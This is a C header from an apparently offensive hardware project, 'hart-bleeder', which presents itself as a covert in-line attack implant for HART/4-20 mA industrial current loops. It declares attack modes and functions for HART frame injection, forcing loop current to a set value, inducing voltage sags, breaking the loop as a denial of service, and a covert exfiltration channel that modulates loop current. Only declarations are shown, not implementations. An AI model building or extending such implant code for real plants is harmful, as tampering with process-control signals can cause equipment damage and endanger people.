/*
 * hart-bleeder — loop_drv.h
 * 4-20 mA current-loop interface driver: current/voltage sensing,
 * loop-power harvesting, resistance modulation, and fault injection
 * for the HART Fieldbus Covert In-Line Attack Implant.
 *
 * Author: jayis1
 * License: GPL-2.0
 */

#ifndef HART_BLEEDER_LOOP_DRV_H
#define HART_BLEEDER_LOOP_DRV_H

#include <stdint.h>

/* ── Loop electrical state ───────────────────────────────────── */
typedef struct {
    float    i_ma;       /* measured loop current (mA)            */
    float    v_loop;     /* measured loop voltage (V)             */
    float    pv_pct;     /* analog PV as % of 4-20 mA span       */
    float    pv_units;   /* PV in engineering units (device-dep) */
    uint32_t ts_ms;
    uint8_t  fault;      /* under/over-current flag              */
} loop_state_t;

/* ── Attack modes ─────────────────────────────────────────────── */
typedef enum {
    LOOP_MODE_PASSIVE   = 0,  /* transparent monitor only          */
    LOOP_MODE_INJECT    = 1,  /* inject HART frames                */
    LOOP_MODE_CLAMP     = 2,  /* force loop current to fixed value */
    LOOP_MODE_SAG       = 3,  /* induce voltage sag (fault)        */
    LOOP_MODE_OPEN_LOOP = 4,  /* break loop continuity (DoS)       */
    LOOP_MODE_COVERT    = 5,  /* low-current covert data exfil     */
} loop_mode_t;

/* ── API ──────────────────────────────────────────────────────── */
int   loop_init(void);
int   loop_sample(loop_state_t *s);
float loop_current_ma(void);
float loop_voltage_v(void);
float loop_pv_percent(void);
int   loop_set_mode(loop_mode_t mode);
loop_mode_t loop_get_mode(void);
int   loop_set_current(float ma);       /* clamp: 4..20 mA */
int   loop_induce_sag(uint32_t duration_ms, float sag_pct);
int   loop_open_circuit(int on);
int   loop_covert_modulate(uint8_t bit);  /* ±0.5 mA FSK covert channel */
void  loop_bypass_relay(int on);           /* bypass sense resistor */

/* ── Statistics ──────────────────────────────────────────────── */
typedef struct {
    uint32_t samples;
    uint32_t faults;
    float    i_min_ma;
    float    i_max_ma;
    float    v_min_v;
    float    v_max_v;
} loop_stats_t;

void loop_get_stats(loop_stats_t *st);
void loop_reset_stats(void);

#endif /* HART_BLEEDER_LOOP_DRV_H */